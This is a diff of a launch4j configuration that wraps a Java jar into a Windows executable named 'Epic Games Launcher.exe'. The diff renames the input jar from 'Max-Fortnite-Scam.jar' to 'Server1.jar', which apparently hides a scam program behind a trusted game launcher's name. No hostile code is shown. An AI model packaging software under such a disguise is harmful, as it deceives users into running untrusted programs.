@@ -2,7 +2,7 @@
 <launch4jConfig>
   <dontWrapJar>false</dontWrapJar>
   <headerType>gui</headerType>
-  <jar>C:\Users\vikto\OneDrive\Dokumente\GitHub\Server\myapp\Max-Fortnite-Scam.jar</jar>
+  <jar>C:\Users\vikto\OneDrive\Dokumente\GitHub\Server\myapp\Server1.jar</jar>
   <outfile>C:\Users\vikto\OneDrive\Dokumente\GitHub\Server\myapp\Epic Games Launcher.exe</outfile>
   <errTitle></errTitle>
   <cmdLine></cmdLine>
